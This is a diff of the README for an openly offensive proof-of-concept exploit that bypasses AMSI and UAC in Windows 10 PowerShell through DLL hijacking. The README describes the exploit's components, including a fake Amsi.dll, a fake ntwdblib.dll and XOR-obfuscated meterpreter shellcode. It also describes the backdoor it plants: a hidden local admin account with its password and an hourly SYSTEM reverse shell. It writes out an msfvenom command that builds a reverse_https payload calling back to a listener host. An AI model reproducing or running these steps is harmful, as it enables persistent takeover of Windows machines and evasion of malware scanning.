@@ -9,8 +9,7 @@ ______ \   _  \   _____|  |__ |    |/ _|__|  | |  |   ___________
 Windows 10 PowerShell5 - Amsi/UAC Bypass/Backdoor/Exploit using DLL Hijacking
 
 Proof of Concept exploit to bypass Microsoft latest AntiMalware Scan Interface technology within powershell5 on Windows 10.
-With this exploit/patch applied, you can take control over powershells program flow by using DLL Hijacking and UAC Bypass techniques.
-Every time powershell is started, a local admin named BadAss with password FacePalm01 will be added to the system (when run by an non elevated administrator account) 
+With this exploit/patch applied, you can take control over powershells program flow by using DLL Hijacking and UAC Bypasstechniques. Every time powershell is started, a local admin named BadAss with password FacePalm01 will be added to the system (when run by an non elevated administrator account) 
 and a reverse (SYSTEM) https meterpreter session (default 192.168.1.120) will be started every hour using a scheduled task.
 
 Current status: 
@@ -31,7 +30,8 @@ This Exploit contains 5 components (and 1 python script):
 p0shKiller.exe	- The main tool to apply the Patch (only needed once).
 UacBypass.dll	- Will be injected into explorer.exe process 
 		  and uses IFileOperation (COM Interface) to copy needed DLL's (only needed once).
-Amsi.dll	- This fake DLL is copied into: C:\Windows\System32\WindowsPowerShell\v1.0, and is the main vulnerable component. 
+Amsi.dll	- This fake DLL is copied into: C:\Windows\System32\WindowsPowerShell\v1.0, 
+		  and is the main vulnerable component. 
 ntwdblib.dll	- Fake ntwdblib.dll copied into C:\Windows\System32, 
 		  which is used by cliconfg.exe (elevated process) to bypass UAC.
 MPAmsiRun.exe	- Xor'ed Meterpreter Shellcode payload that is copied into C:\Windows\System32 and called by Amsi.dll.
@@ -39,7 +39,7 @@ MPAmsiRun.exe	- Xor'ed Meterpreter Shellcode payload that is copied into C:\Wind
 XORMeter.py	- Python Script to generate your own Meterpreter Payload (MPAmsiRun.exe) By @vvalien1
 
 The following shellcode is used as payload and compiled within the code:
-sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.120 LPORT=443 EXITFUNC=thread -f hex > Shellcode.txt
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.120 LPORT=443 EXITFUNC=thread -f hex > Shellcode.txt
 
 Setup your remote msf listener:
 
